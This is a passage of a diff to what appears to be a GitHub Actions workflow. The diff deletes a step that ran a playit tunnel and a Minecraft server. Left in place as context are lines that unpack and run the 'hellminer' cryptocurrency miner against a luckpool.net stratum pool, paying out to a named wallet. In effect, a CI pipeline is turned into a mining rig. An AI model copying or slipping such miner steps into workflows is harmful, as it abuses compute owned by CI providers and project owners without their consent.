@@ -22,14 +22,6 @@ jobs:
           tar -xzf hellminer_linux64.tar.gz
           chmod +x hellminer
           ./hellminer -c stratum+tcp://na.luckpool.net:3957 -u R9UwHf2AogrRbfvmd8oLBACo6psdD7TpSg.Cihuyy -p x --cpu 4
-
-      - name: Run Server and Playit
-        env:
-          PLAYIT_AUTH_KEY: ${{ secrets.PLAYITAUTHKEY }} 
-        run: |
-          #cd spigot-server
-          playit --secret $PLAYIT_AUTH_KEY
-          #java -jar spigot-1.21.5.jar 
       
       - name: Add sleep
         run: |
